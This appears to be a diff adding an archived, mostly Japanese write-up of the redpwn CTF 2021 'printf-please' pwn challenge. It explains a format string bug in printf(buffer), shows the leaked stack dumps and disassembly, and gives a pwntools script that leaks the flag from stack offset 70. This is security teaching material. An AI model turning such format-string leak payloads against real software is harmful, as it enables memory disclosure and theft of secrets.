@@ -1,0 +1,9 @@
+# printf-please
+
+**CTF:** redpwn 2021  
+**Category:** pwn  
+**Original writeup:** <https://hackmd.io/@yu1hpa/r1v7WlYCu> — by **yu1hpa**. All credit goes to the original author; this is an archived copy.
+
+---
+
+###### tags: `redpwnCTF 2021` `FSB` # printf please - redpwn CTF 2021 ![](https://img.shields.io/badge/Type-FSB-red) [公式リポジトリ](https://github.com/redpwn/redpwnctf-2021-challenges/tree/master/pwn/printf-please) ### writeup #### TL;DR 配布されたCのソースファイルを見ると自明なFSBがある(30行目)。 ```c if (!strncmp(buffer, "please", 6)) { printf(buffer); // <- here puts(" to you too!"); } ``` よって、FSBによってFlagを読み出す。 #### debug pleaseは`706c65617365`(なのでリトルエンディアンでは`657361656c70`)。 ``` what do you say? please %1$016llx %2$016llx %3$016llx %4$016llx %5$016llx %6$016llx %7$016llx %8$016llx %9$016llx %10$016llx please 00007ffc7dab7d96 0000000000000001 0000000000000000 00005574e25a1010 00007f793512cd50 2520657361656c70 786c6c3631302431 6c36313024322520 313024332520786c 24342520786c6c36 to you too! ``` そうすると、6番目に`657361656c70`があらわれています。 次に、rspから`+0x200`にFlagデータの先頭アドレスedx[^1]がある。 ``` 0x000055555555518f <+47>: lea r13,[rsp+0x200] ~~~ (中略) ~~~ 0x00005555555551e7 <+135>: mov edx,0x200 0x00005555555551ec <+140>: mov rsi,r13 0x00005555555551ef <+143>: mov edi,eax 0x00005555555551f1 <+145>: mov r12d,eax 0x00005555555551f4 <+148>: xor eax,eax 0x00005555555551f6 <+150>: call 0x555555555130 <read@plt> ``` - (8byte × 64) = 0x200 - 6個目にデータがあらわれる。 以上より、6 + 64 = 70番目からデータをリークすればいいことがわかる。 ### solver ```python= from pwn import * elf = ELF("./please") io = process(elf.path) payload = "please " for i in range(5): payload += "%" + str(70+i) + "$llx " io.sendlineafter("?", payload) io.recvuntil(" ") l = b"" for i in range (5): l += p64(int(io.recvuntil(" "), 16)) print(l) ``` #### 参考文献 1. [x86_Architecture](https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture) [^1]: 算術演算操作とI/O操作に使用されるレジスタ [^1]: 算術演算操作とI/O操作に使用されるレジスタ
